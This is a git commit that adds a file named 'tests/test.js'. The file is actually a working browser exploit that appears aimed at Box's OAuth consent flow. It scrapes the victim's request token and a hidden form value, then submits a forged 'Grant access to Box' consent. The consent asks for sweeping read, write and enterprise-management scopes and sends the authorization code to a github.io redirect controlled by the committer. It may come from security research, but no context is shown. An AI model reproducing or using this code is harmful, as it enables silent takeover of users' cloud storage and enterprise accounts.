a8b3a3ad77246376e418e2851864c56ed8afa964
ninetyn1ne <54266913+ninetyn1ne@users.noreply.github.com>
2021-03-24 22:54:14 +0530

    Create test.js

---
+++ tests/test.js
@@ -0,0 +1,26 @@
+var url = "https://app.box.com/api/oauth2/authorize?client_id=1vewmllcy3lwa4y7b3yjft4xn6g9k8qf&response_type=code"
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get',url,true);
+req.send();
+
+function reqListener() {
+req_token = this.responseText.split("request_token = '")[1].split("';</script>")[0];
+var parser = new DOMParser();
+var htmlDoc = parser.parseFromString(this.responseText, 'text/html');
+var ic_val = htmlDoc.getElementsByTagName("input")[10].value;
+makepostreq(ic_val,req_token);
+}; 
+
+function makepostreq(ic_val,req_token){
+
+	var body = "client_id=1vewmllcy3lwa4y7b3yjft4xn6g9k8qf&response_type=code&redirect_uri=https%3A%2F%2Fninetyn1ne.github.io%2Ftest&scoperroot_readonly+root_readwrite+manage_groups+manage_webhook+manage_enterprise_properties+manage_data_retention+item_execute_integration+manage_app_users+manage_managed_users&folder_id=&file_id=&parent_token=&parent_service_id=&service_action_id=&doconsent=doconsent&ic="+ic_val+"&consent_accept=Grant+access+to+Box&request_token="+req_token;
+
+	var form_url = "https://app.box.com/api/oauth2/authorize?client_id=1vewmllcy3lwa4y7b3yjft4xn6g9k8qf&response_type=code";
+
+	req.open('POST',form_url,true);
+	req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	req.send(body);
+
+}
